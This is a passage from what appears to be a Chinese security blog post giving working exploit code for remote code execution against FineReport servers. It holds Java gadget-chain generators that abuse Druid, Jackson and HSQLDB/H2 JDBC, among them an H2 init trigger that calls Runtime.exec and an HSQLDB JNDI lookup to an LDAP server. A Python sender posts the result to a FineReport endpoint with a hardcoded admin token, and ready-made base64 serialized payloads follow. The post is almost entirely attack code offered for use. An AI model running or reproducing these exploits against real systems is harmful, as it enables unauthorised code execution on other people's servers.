class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HdqlAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapPld</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Deserialize/FineReportJackson/Command/open .&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;call \&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;&quot;</span>+ ldapPld + <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:hsqldb:file:/Users/jasper/Downloads/test/&quot;</span>;</span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setValidationQuery(query);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line">        druidXADataSource.setDriverClassName(<span class="string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">// 通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">// 即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap的get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">            ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line"><span class="comment">//        SerializeUtils.unserializeBase64(payload);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d716600ceef9543768c7f24ed3d76387.png"></p><h3 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h3><p>h2 jdbc attack直接rce，直接上exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">////        System.out.println(payload);</span></span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="发送脚本"><a href="#发送脚本" class="headerlink" title="发送脚本"></a>发送脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">host</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    url = host + <span class="string">&quot;/webroot/decision/remote/design/channel&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInRlbmFudElkIjoiZGVmYXVsdCIsImlzcyI6ImZhbnJ1YW4iLCJkZXNjcmlwdGlvbiI6ImFkbWluKGFkbWluKSIsImV4cCI6MTcyMzEzNDgxNiwiaWF0IjoxNzIzMTMxMjE5LCJqdGkiOiJpYnFtcVNSek94RmYrQ3JnUzlXeG5NMDdqT3BYVWF4RHV0czMvNGpTKzBqdGlCSzcifQ.x0xKCO4bR6EVGqEoI7W4es7aRWPn5idSTeOYBleBumM&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">## h2 jdbc attack rce</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    <span class="comment">##  hsqldb 打 jackson</span></span><br><span class="line">    b = <span class="string">b&quot;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